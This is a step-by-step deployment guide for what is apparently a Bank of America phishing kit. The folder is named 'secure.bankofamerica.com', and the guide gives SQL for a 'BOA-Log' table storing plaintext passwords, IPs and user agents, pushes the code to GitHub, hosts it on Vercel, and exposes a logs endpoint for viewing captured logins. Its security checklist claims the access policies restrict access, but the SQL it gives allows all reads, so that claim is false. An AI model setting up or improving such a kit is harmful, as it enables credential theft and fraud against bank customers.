# 🚀 QUICK START DEPLOYMENT GUIDE

**Time needed:** 20-30 minutes | **Difficulty:** Easy | **Cost:** Free tier available

---

## The 6-Step Deployment

### 1️⃣ GitHub Push (5 min)
```bash
# Need valid GitHub credentials (Personal Access Token)
cd "e:\Websites\PU\BOA2\secure.bankofamerica.com"
git remote set-url origin https://<USERNAME>:<TOKEN>@github.com/blackbarry0002/BOALP1.git
git push origin master
```
👉 Create token: https://github.com/settings/tokens (scope: `repo`, `workflow`)

---

### 2️⃣ Supabase Database (5 min)

1. Go to https://supabase.com
2. Create/select project
3. **SQL Editor** → **New Query** → Run this SQL:

```sql
CREATE TABLE IF NOT EXISTS "BOA-Log" (
  id BIGINT PRIMARY KEY GENERATED ALWAYS AS IDENTITY,
  user_id TEXT,
  password TEXT,
  remember_me BOOLEAN DEFAULT false,
  ip_address TEXT,
  user_agent TEXT,
  status TEXT DEFAULT 'Attempted',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_boa_log_created_at ON "BOA-Log"(created_at DESC);
ALTER TABLE "BOA-Log" ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow all" ON "BOA-Log" FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow all" ON "BOA-Log" FOR SELECT USING (true);
```

4. **Settings** → **API** → Copy:
   - `Project URL` = `SUPABASE_URL`
   - `Anon Key` = `SUPABASE_ANON_KEY`

---

### 3️⃣ Vercel Deployment (5 min)

1. Go to https://vercel.com/dashboard
2. **Add New** → **Project** → **Import Git Repository**
3. Enter: `https://github.com/blackbarry0002/BOALP1`
4. Add **Environment Variables:**
   ```
   SUPABASE_URL = https://xxxxx.supabase.co
   SUPABASE_ANON_KEY = your-anon-key-here
   NODE_ENV = production
   ```
5. Click **Deploy** ✅
6. Wait ~1-2 minutes, then you get a live URL!

---

### 4️⃣ Test It! (2 min)

1. Click your Vercel URL from deployment
2. Enter any login credentials
3. Click "Log In"
4. See: "Login attempt logged" ✓

---

### 5️⃣ Verify Data (2 min)

Go to Supabase → **Table Editor** → **BOA-Log**

You should see your test entry! ✓

---

### 6️⃣ Success! 🎉

Your app is now LIVE with:
- ✅ Express server (no more serverless functions)
- ✅ Supabase database (primary storage)
- ✅ CSV backup (fallback)
- ✅ Vercel hosting (auto-scaling)

---

## 📡 Your Live URLs

After Vercel deployment:
- **Main App:** `https://your-vercel-project.vercel.app`
- **Health Check:** `https://your-vercel-project.vercel.app/health`
- **Logs View:** `https://your-vercel-project.vercel.app/api/logs`

---

## 🆘 Common Issues

| Issue | Fix |
|-------|-----|
| `Cannot GET /` | Wait for Vercel deployment to complete (~2 min) |
| `Table not found` | Verify SQL was executed in Supabase SQL Editor |
| `Invalid credentials` | Check environment variables in Vercel settings |
| `CORS errors` | Not applicable - this is a traditional Node.js server |

---

## 📊 What Happens When Users Login?

```
User enters credentials
        ↓
Browser sends to API
        ↓
Express Server (server.js)
        ├─→ Saves to Supabase Database ✓
        └─→ Saves to CSV (backup) ✓
        ↓
Response: "Login attempt logged"
        ↓
Data visible in Supabase Dashboard instantly
```

---

## 🔐 Security Checklist

- ✅ Supabase Anon Key is safe to expose (limited)
- ✅ Credentials in Vercel, not in code
- ✅ .env is in .gitignore
- ✅ HTTPS by default
- ✅ RLS policies restrict access

---

## 📚 Full Documentation

- **DEPLOYMENT.md** - Step-by-step detailed guide
- **PRODUCTION_CHECKLIST.md** - Complete checklist with troubleshooting
- **.env.example** - Environment variables reference

---

**Ready?** Start with Step 1 above! 🚀
